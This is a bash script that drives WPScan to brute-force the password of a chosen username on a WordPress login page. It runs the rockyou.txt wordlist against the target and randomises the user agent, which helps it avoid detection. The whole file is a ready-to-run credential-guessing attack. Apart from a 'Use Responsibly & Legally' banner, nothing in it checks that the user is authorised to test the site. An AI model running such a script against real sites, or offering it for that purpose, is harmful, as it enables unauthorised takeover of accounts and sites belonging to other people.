#!/bin/bash

# Clear screen for clean interface
clear

echo "#############################################"
echo "#         WPScan Brute Force Script          #"
echo "#           Use Responsibly & Legally        #"
echo "#############################################"
echo ""

# Ask for login URL (site with login form)
read -p "Enter full WordPress login URL (e.g., https://example.com): " SITE

# Validate input
if [[ -z "$SITE" ]]; then
  echo "❌ No URL entered. Exiting."
  exit 1
fi

# Ask for username
read -p "Enter the username to brute-force: " UNAME

if [[ -z "$UNAME" ]]; then
  echo "❌ No username provided. Exiting."
  exit 1
fi

# Default password list path
WORDLIST="/usr/share/wordlists/rockyou.txt"

# Check if wordlist exists
if [[ ! -f "$WORDLIST" ]]; then
  echo "❌ Wordlist not found at $WORDLIST"
  exit 1
fi

echo ""
echo "📌 Target Site : $SITE"
echo "👤 Username    : $UNAME"
echo "🔐 Wordlist    : $WORDLIST"
echo ""
echo "🚀 Starting brute-force attack..."

# Run WPScan with brute-force flags
wpscan --url "$SITE" \
  --usernames "$UNAME" \
  --passwords "$WORDLIST" \
  --random-user-agent \
  --disable-tls-checks

echo ""
echo "✅ Scan finished. Check above output for any successful logins."

